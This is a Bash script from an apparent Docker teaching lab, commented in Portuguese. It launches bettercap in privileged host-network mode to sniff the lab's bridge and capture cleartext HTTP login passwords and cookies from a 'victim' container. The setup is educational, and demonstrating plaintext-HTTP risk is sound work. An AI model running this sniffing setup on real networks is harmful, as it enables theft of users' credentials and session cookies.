#!/usr/bin/env bash
# Sobe o bettercap via Docker para farejar a rede do lab e capturar o trafego
# HTTP em texto claro (login/senha e cookie), tudo na mesma maquina.
#
# Uso:  ./run-attacker.sh
# (Suba o lab antes:  docker compose up -d --build)
set -euo pipefail

# Descobre a interface bridge que o Docker criou para a rede do lab, a partir do
# container do servidor (evita adivinhar o nome do projeto/rede).
NETID=$(docker inspect lab-server \
  -f '{{range .NetworkSettings.Networks}}{{.NetworkID}}{{end}}' 2>/dev/null | cut -c1-12)

if [ -z "${NETID:-}" ]; then
  echo "Nao achei o container 'lab-server'. Suba o lab primeiro:"
  echo "    docker compose up -d --build"
  exit 1
fi

BR="br-$NETID"
CAPLET_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "[atacante] farejando a bridge do lab: $BR"
echo "[atacante] gere um login na vitima e observe o POST /login em claro. Ctrl+C encerra."
echo

# --net=host: enxerga a bridge do Docker no host (onde passa o trafego do lab).
# --privileged: sniffing (raw sockets).
docker run -it --rm \
  --net=host \
  --privileged \
  -v "$CAPLET_DIR":/caplets \
  bettercap/bettercap -iface "$BR" -caplet /caplets/http-sniff.cap
